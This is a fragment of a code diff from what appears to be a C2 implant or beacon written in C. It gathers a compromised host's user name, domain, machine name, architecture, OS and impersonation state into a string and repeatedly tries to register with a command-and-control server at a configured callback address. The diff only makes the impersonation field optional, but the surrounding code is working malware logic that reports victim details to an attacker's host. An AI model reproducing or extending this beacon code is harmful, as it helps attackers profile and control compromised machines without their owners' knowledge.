@@ -46,8 +46,15 @@ void main()
     }
 
     // format the data correctly so it can be used when we call back to the c2
-    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s&impersonate=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
-                                                                                                  CompInfo.Arch, CompInfo.OS, CompInfo.Secure, IMPERSONATE_SESSION);
+
+    if (strncmp(IMPERSONATE_SESSION, "None", 4) == 0)
+    {
+        sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
+                                                                                                      CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
+    } else {
+        sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s&impersonate=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
+                                                                                                      CompInfo.Arch, CompInfo.OS, CompInfo.Secure, IMPERSONATE_SESSION);
+    }
 
     // register back with the c2
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
